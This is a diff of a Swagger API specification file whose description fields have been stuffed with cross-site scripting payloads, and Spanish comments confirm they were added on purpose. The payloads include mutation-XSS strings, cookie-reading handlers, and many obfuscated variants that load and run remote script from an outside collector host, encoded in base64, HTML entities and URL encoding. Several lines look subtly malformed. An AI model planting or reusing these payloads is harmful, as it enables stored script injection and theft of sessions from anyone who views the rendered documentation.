@@ -2,6 +2,8 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style>
+    
     /><img src=q onerror=alert(1)>
     "><img/src=x/onerro=6><img/src="1"/onerror=alert(1);>
     "<%21--><Svg+OnLoad%3Dconfirm%3F.%28%2Fd3rk😈%2F%29<%21--1"%29"<%21--><Svg%2BOnLoad%3Dconfirm%3F.%28%2Fd3rk😈%2F%29<%21--
@@ -34,6 +36,8 @@ info:
     '"1<!--></Title/</Textarea/</Script/><Details/Open/OnToggle=(confirm)(1)>
     1"<!--><Svg OnLoad=(confirm)(document.cookie)<!--
     ");alert(document.domain);//
+    
+    <!-- Astroo18 XSS payloads with xss.report -->
     '"><script src=https://xss.report/c/astroo18></script>
     javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/astroo18\';document.body.appendChild(a)')
     "><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FzdHJvbzE4Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>
@@ -44,16 +48,37 @@ info:
     <body onload="var a=document.createElement('script');a.src='https://xss.report/c/astroo18';document.body.appendChild(a)">
     "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FzdHJvbzE4Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
     "><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FzdHJvbzE4Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>
-    "><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/astroo18&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+    "><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/astroo18&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
     <script>$.getScript("//xss.report/c/astroo18")</script>
     javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\astroo18/.source))//>
     <iframe src="javascript:var a=document.createElement('script');a.src='https://xss.report/c/astroo18';document.body.appendChild(a)"></iframe>
     <audio src="x" onerror="var a=document.createElement('script');a.src='https://xss.report/c/astroo18';document.body.appendChild(a)">
     <script>fetch("//xss.report/c/astroo18").then(r=>r.text()).then(t=>eval(t))</script>
+    
+    <!-- URL-encoded versions -->
+    %27%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss.report%2Fc%2Fastroo18%3E%3C%2Fscript%3E
+    javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%27script%5C%27%29%3Ba.src%3D%5C%27https%3A%2F%2Fxss.report%2Fc%2Fastroo18%5C%27%3Bdocument.body.appendChild%28a%29%27%29
+    %22%3E%3Cvideo%3E%3Csource%20onerror%3Deval%28atob%28this.id%29%29%20id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FzdHJvbzE4Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw%3D%3D%3E
+    %3Cscript%3Efunction%20b%28%29%7Beval%28this.responseText%29%7D%3Ba%3Dnew%20XMLHttpRequest%28%29%3Ba.addEventListener%28%22load%22%2C%20b%29%3Ba.open%28%22GET%22%2C%20%22%2F%2Fxss.report%2Fc%2Fastroo18%22%29%3Ba.send%28%29%3B%3C%2Fscript%3E
+    var%20a%3Ddocument.createElement%28%22script%22%29%3Ba.src%3D%22https%3A%2F%2Fxss.report%2Fc%2Fastroo18%22%3Bdocument.body.appendChild%28a%29%3B
+    %3Csvg%20onload%3D%22javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%27script%5C%27%29%3Ba.src%3D%5C%27https%3A%2F%2Fxss.report%2Fc%2Fastroo18%5C%27%3Bdocument.body.appendChild%28a%29%27%29%22%20%2F%3E
+    %3Cdiv%20onmouseover%3D%22var%20a%3Ddocument.createElement%28%27script%27%29%3Ba.src%3D%27https%3A%2F%2Fxss.report%2Fc%2Fastroo18%27%3Bdocument.body.appendChild%28a%29%22%3EHover%20me%3C%2Fdiv%3E
+    %3Cbody%20onload%3D%22var%20a%3Ddocument.createElement%28%27script%27%29%3Ba.src%3D%27https%3A%2F%2Fxss.report%2Fc%2Fastroo18%27%3Bdocument.body.appendChild%28a%29%22%3E
+    %22%3E%3Cimg%20src%3Dx%20id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FzdHJvbzE4Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw%3D%3D%20onerror%3Deval%28atob%28this.id%29%29%3E
+    %22%3E%3Cinput%20onfocus%3Deval%28atob%28this.id%29%29%20id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FzdHJvbzE4Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw%3D%3D%20autofocus%3E
+    %22%3E%3Ciframe%20srcdoc%3D%22%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%26%23118%3B%26%2397%3B%26%23114%3B%26%2332%3B%26%2397%3B%26%2361%3B%26%23112%3B%26%2397%3B%26%23114%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2399%3B%26%23114%3B%26%23101%3B%26%2397%3B%26%23116%3B%26%23101%3B%26%2369%3B%26%23108%3B%26%23101%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2340%3B%26%2334%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2334%3B%26%2341%3B%26%2359%3B%26%2397%3B%26%2346%3B%26%23115%3B%26%23114%3B%26%2399%3B%26%2361%3B%26%2334%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%23115%3B%26%2358%3B%26%2347%3B%26%2347%3Bxss.report%2Fc%2Fastroo18%26%2334%3B%26%2359%3B%26%23112%3B%26%2397%3B%26%23114%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2398%3B%26%23111%3B%26%23100%3B%26%23121%3B%26%2346%3B%26%2397%3B%26%23112%3B%26%23112%3B%26%23101%3B%26%23110%3B%26%23100%3B%26%2367%3B%26%23104%3B%26%23105%3B%26%23108%3B%26%23100%3B%26%2340%3B%26%2397%3B%26%2341%3B%26%2359%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%22%3E
+    %3Cscript%3E%24.getScript%28%22%2F%2Fxss.report%2Fc%2Fastroo18%22%29%3C%2Fscript%3E
+    javascript%3A%22%2F%2A%27%2F%2A%60%2F%2A--%3E%3C%2Fnoscript%3E%3C%2Ftitle%3E%3C%2Ftextarea%3E%3C%2Fstyle%3E%3C%2Ftemplate%3E%3C%2Fnoembed%3E%3C%2Fscript%3E%3Chtml%20%22%20onmouseover%3D%2F%2A%26lt%3Bsvg%2F%2A%2Fonload%3D%28import%28%2Fhttps%3A%5Cxss.report%5Cc%5Castroo18%2F.source%29%29%2F%2F%3E
+    %3Ciframe%20src%3D%22javascript%3Avar%20a%3Ddocument.createElement%28%27script%27%29%3Ba.src%3D%27https%3A%2F%2Fxss.report%2Fc%2Fastroo18%27%3Bdocument.body.appendChild%28a%29%22%3E%3C%2Fiframe%3E
+    %3Caudio%20src%3D%22x%22%20onerror%3D%22var%20a%3Ddocument.createElement%28%27script%27%29%3Ba.src%3D%27https%3A%2F%2Fxss.report%2Fc%2Fastroo18%27%3Bdocument.body.appendChild%28a%29%22%3E
+    %3Cscript%3Efetch%28%22%2F%2Fxss.report%2Fc%2Fastroo18%22%29.then%28r%3D%3Er.text%28%29%29.then%28t%3D%3Eeval%28t%29%29%3C%2Fscript%3E
+    
     <script src="https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
     <script src="https://cdn.jsdelivr.net/npm/htmx.org"></script><any hx-trigger="x[1)}),alert(origin)//]">
     <script src="https://www.googletagmanager.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
+    
+    ">
   version: production
 basePath: /JSSResource/
 produces:
@@ -78,9 +103,11 @@ paths:
     delete:
       parameters:
         - description: |
-            /"><img src=q onerror=alert(1)>
+            <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style>
+            /><img src=q onerror=alert(1)>
             "><img/src=x/onerro=6><img/src="1"/onerror=alert(1);>
-            "<%21--><Svg+OnLoad%3Dconfirm%3F.%28%2Fd3rk😈%2F%29<%21--1"%29"<%21--><Svg%2BOnLoad%3Dconfirm%3F.%28%2Fd3rk😈%2F%29<%21--
+            <script src="https://xss.report/c/astroo18></script>
+            ">
           format: int64
           in: path
           name: id
@@ -94,9 +121,8 @@ paths:
       operationId: deleteGroupById
       summary: Deletes a group by id
 
-# Resto del archivo igual que el original...
-# Solo agregué los payloads en el campo description del info y del parámetro
-# Continúa con el resto del archivo YAML original...
+# ... resto del archivo YAML ...
+
 
 definitions:
   '':
